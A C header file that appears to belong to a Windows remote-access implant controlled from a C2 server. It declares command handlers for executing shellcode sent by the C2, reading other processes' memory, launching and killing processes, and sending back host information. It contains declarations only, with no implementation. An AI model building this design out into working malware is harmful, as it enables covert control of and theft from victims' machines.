#pragma once
#include <Windows.h>
#include <stdio.h>

#include "debug.h"
#include "error.h"
#include "process.h"
#include "system.h"
#include "protocol.h"
#include "network.h"

/**
* @brief Maximum number of arguments to parse from a command string. This is used for commands like memread that require multiple parameters.
 */
#define MAX_ARGS 3

/**
* @brief Base for numeric conversions, such as parsing PIDs from command arguments.
 */
#define BASE 10

/**
*@brief Maximum length for string representations of DWORD values.
 */
#define DWORD_STR_LEN 11

// Generic Command handler function.
typedef BOOL (*CommandFunction) (DWORD len, PBYTE data, SOCKET sock);

// Enum containing commands. CMD_UNK should always be last.
// If you need to add more commands, add them after CMD_HANDLES, 
// but before CMD_UNK. These values MUST match the values in 
// protocol.py. If you add/remove commands here, please update them
// in protocol.py as well!
typedef enum _CMD_ID {
	CMD_QUIT,
	CMD_HELP,
	CMD_SYSTEMINFO,
	CMD_PS,
	CMD_MODULES,
	CMD_RUN,
	CMD_KILL,
	CMD_PSNT,
	CMD_MODULESNT,
	CMD_HANDLES,
	CMD_SHELLCODEEXEC,
	CMD_MEMREAD,
	CMD_UNK,
} CMD_ID;

// For each command, contains string representation, function handler, and help string.
typedef struct COMMAND_MAP {
	CMD_ID id;
	PCWSTR cmd;
	CommandFunction handler;
	PCWSTR help;
} COMMAND_MAP;

// Global command dispatch table.
extern CONST COMMAND_MAP G_CommandTable[];

/**
* @brief Reads memory from a specified process and sends the result back to the C2.
 * 
 * @param[in] len    Length of the command arguments buffer.
 * @param[in] data   Pointer to a buffer containing the command arguments (PID, address, size).
 * @param[in] sock   The connected socket for sending responses.
 * 
 * @return  BOOL    Returns TRUE if the memory read was successful and response sent, FALSE otherwise.
*/
BOOL CmdMemRead(DWORD len, PBYTE data, SOCKET sock);

/**
* @brief Executes arbitrary shellcode received from the C2.
* 
* @param[in] len    Length of the shellcode buffer.
* @param[in] data   Pointer to the buffer containing the shellcode.
* @param[in] sock   The connected socket for sending responses.
* 
* @return  BOOL    Returns TRUE if the shellcode was executed successfully, FALSE otherwise.
*/
BOOL CmdShellcodeExec(DWORD len, PBYTE data, SOCKET sock);

/**
 * @brief Signals the implant to terminate and sends an acknowledgment to the C2.
 *
 * @param[in] len      Unused.
 * @param[in] data	   Unused.
 * @param[in] sock     The connected socket for sending the quit acknowledgment.
 *
 * @return  BOOL       Returns FALSE, specifying that the implant should cleanup and terminate.
 */
BOOL CmdQuit(DWORD len, PBYTE data, SOCKET sock);

/**
 * @brief  Builds and sends a list of all available commands and their descriptions.
 *
 * @param[in] len   Unused.
 * @param[in] data	Unused.
 * @param[in] sock  The connected socket for sending the help response.
 *
 * @return    BOOL  Returns TRUE to keep the implant active.
 */
BOOL CmdHelp(DWORD len, PBYTE data, SOCKET sock);

/**
 * @brief  Collects and sends host identity, privilege level, and hardware info.
 *
 * @param[in] len    Unused.
 * @param[in] data   Unused.
 * @param[in] sock   The connected socket for sending the response.
 *
 * @return    BOOL	 Returns TRUE to keep the implant active.
 */
BOOL CmdSystemInfo(DWORD len, PBYTE data, SOCKET sock);

/**
 * @brief  Gathers and sends all currently running processes.
 *
 * @param[in] len    Unused.
 * @param[in] data   Unused.
 * @param[in] sock   The connected socket for sending the response.
 *
 * @return    BOOL	 Returns TRUE to keep the implant active.
 */
BOOL CmdPs(DWORD len, PBYTE data, SOCKET sock);

/**
 * @brief  Lists all DLL modules loaded into a target process and sends the result.
 *
 * @param[in] len    Length of buffer containing PID
 * @param[in] data	 Pointer to a buffer containing the target PID.
 * @param[in] sock   The connected socket for sending the response.
 *
 * @return    BOOL	 Returns TRUE to keep the implant active.
 */
BOOL CmdModules(DWORD len, PBYTE data, SOCKET sock);

/**
 * @brief  Executes a new process and sends the result.
 * 
 * @param[in] len    Length of buffer containing path
 * @param[in] data	 A buffer containing the absolute path
 *					 or system-resolvable name of the executable.
 * @param[in] sock   The connected socket for sending the response.
 *
 * @return    BOOL   Returns TRUE to keep the implant active.
 */
BOOL CmdRun(DWORD len, PBYTE data, SOCKET sock);

/**
 * @brief  Terminates a process by its PID and sends the result.
 *
 * @param[in] len    Length of buffer containing PID.
 * @param[in] data	 A buffer containing the PID to terminate.
 * @param[in] sock   The connected socket for sending the response.
 *
 * @return    BOOL	 Returns TRUE to keep the implant active.
 */
BOOL CmdKill(DWORD len, PBYTE data, SOCKET sock);

/**
 * @brief  Native implementation of process enumeration using NT APIs.
 *
 * @param[in] len    Unused.
 * @param[in] data   Unused.
 * @param[in] sock   The connected socket for sending the response.
 *
 * @return    BOOL	 Returns TRUE to keep the implant active.
 */
BOOL CmdPsNt(DWORD len, PBYTE data, SOCKET sock);

/**
 * @brief  Native implementation of module enumeration using NT APIs.
 *
 * @param[in] len    Length of buffer containing target PID.
 * @param[in] data	 A buffer containing the target PID.
 * @param[in] sock   The connected socket for sending the response.
 *
 * @return    BOOL	 Returns TRUE to keep the implant active.
 */
BOOL CmdModulesNt(DWORD len, PBYTE data, SOCKET sock);

/**
 * @brief  Enumerates all open handles within a target process.
 *
 * @param[in] len    Length of buffer containing target PID.
 * @param[in] data	 A buffer containing the target PID.
 * @param[in] sock   The connected socket for sending the response.
 *
 * @return    BOOL	 Returns TRUE to keep the implant active.
 */
BOOL CmdHandles(DWORD len, PBYTE data, SOCKET sock);

/**
 * @brief Receives a numeric command ID and dispatches it to the appropriate handler.
 *
 * This function serves as the central hub for the network receive loop. It accepts the
 * numeric CMD_ID directly from the TLV message type field and looks up the corresponding
 * function pointer in the global command dispatch table (G_CommandTable).
 *
 * @param[in] cmdId   The numeric command ID from the TLV message type field.
 * @param[in] dataLen The length of optional data for the command.
 * @param[in] data    A pointer to the optional data for the command.
 * @param[in] sock    The connected socket for sending responses.
 *
 * @return  BOOL      Returns TRUE if the implant should continue its execution loop.
 *					  Returns FALSE if a "quit" command was specified,
 *                    signaling the implant to perform cleanup and terminate.
 */
BOOL CommandDispatcher(DWORD cmdId, DWORD dataLen, PBYTE data, SOCKET sock);
